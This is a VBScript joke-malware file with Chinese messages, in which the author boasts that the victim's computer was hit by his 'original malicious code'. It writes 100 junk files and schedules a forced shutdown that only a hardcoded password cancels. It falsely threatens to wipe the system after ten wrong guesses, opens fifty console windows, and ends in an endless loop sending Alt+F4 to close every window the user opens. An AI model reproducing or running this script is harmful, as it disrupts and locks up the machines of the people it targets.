Do Until t_i=1
t_i=t_i+1
T=T+"吴洛凡最牛逼 "
Loop
Do
Set fs = CreateObject("Scripting.FileSystemObject")
Set f = fs.OpenTextFile(I&".吴洛凡最牛逼", 2, True, -2)
f.Write T
f.Close
I=I+1
If I = 100 then
Exit Do
End If
Loop
Dim wshshell
MsgBox "我的电脑怎么了？"
MsgBox "你的电脑被吴洛凡同学的完全原创恶意代码攻击了"
MsgBox "有挽救的办法吗？"
MsgBox "没了(=^ ^=)"
Set wshshell = CreateObject("wscript.shell")
wshshell.Run "cmd.exe /c shutdown -s -t 120",0,True
MsgBox "输入密码"
Dim a
Do Until a = "5254754wlf"
a = InputBox ("请输入密码解除关机，如果错误超过十次伟大全能的吴洛凡就会摧毁你的操作系统 ")

Loop
MsgBox "密码正确"
MsgBox "解除关机"
WScript.Sleep 1000
wshshell.Run"cmd.exe /c shutdown -a",0,True
MsgBox "其实我毁不掉你的系统"
MsgBox "但我很厉害哒"
Set shell=CreateObject("wscript.Shell")
a=1
Do
shell.Run "cmd /k MODE con: COLS=14 LINES=5&@echo off & color "&a&"7 &echo "&a&" "
If a=50 Then Exit do
a=a+1
Loop
MsgBox "这是惩罚，你打开的一切都会被吴洛凡关闭"
dim WSHshell 
 
set WSHshell = wscript.createobject("wscript.shell") 
 
while(1) 
 
WSHshell.SendKeys "%{F4}" 
 
Loop 